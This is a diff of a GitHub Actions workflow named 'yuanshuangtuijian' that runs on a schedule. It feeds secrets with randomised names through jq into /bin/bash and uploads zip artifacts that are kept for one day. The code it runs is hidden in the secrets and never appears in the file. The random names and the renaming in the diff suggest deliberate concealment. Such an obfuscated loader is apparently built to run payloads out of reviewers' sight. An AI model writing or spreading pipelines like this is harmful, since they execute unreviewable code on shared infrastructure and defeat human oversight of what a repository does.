@@ -1,31 +1,27 @@
 name: yuanshuangtuijian
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '23 5/6 * * *'
-jobs:  # 28136
+    - cron: '31 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanshuangtuijian
         env:
-          qbov114: ${{ secrets.qbov114 }}
+          t73378: ${{ secrets.t73378 }}
         run: |
-          echo $qbov114 | jq -r .e217 | /bin/bash
-          echo $qe58 | jq -r .mt61 | /bin/bash
-          echo $ddad9 | jq -r .g17 | /bin/bash
-          echo $uvssu90 | jq -r .ny4661 | /bin/bash
-          echo $atshm0 | jq -r .xydr8 | /bin/bash
-          echo $fw751 | jq -r .cchym2173 | /bin/bash
-          echo $dph2120 | jq -r .xz26 | /bin/bash
-          echo $o82013 | jq -r .yiue65634 | /bin/bash
-          echo $nsg8 | jq -r .j7 | /bin/bash
-          echo $av02 | jq -r .hbd96254 | /bin/bash
-          echo $k0 | jq -r .c1438 | /bin/bash
-          echo $kejx37 | jq -r .gp22673 | /bin/bash
-          echo $wy17 | jq -r .av5 | /bin/bash
-          echo $zynw628 | jq -r .b089 | /bin/bash
-          echo $dwm15204 | jq -r .p630 | /bin/bash
+          printf '%s' "$t73378" | jq -r .q4960 | /bin/bash
+          printf '%s' "$kmef31913" | jq -r .tjw88475 | /bin/bash
+          printf '%s' "$dl68785" | jq -r .vw3522 | /bin/bash
+          printf '%s' "$uqco158" | jq -r .gs867 | /bin/bash
+          printf '%s' "$d846" | jq -r .qiozg49 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: JkeXsWWc
+          path: "*.zip"
+          retention-days: 1
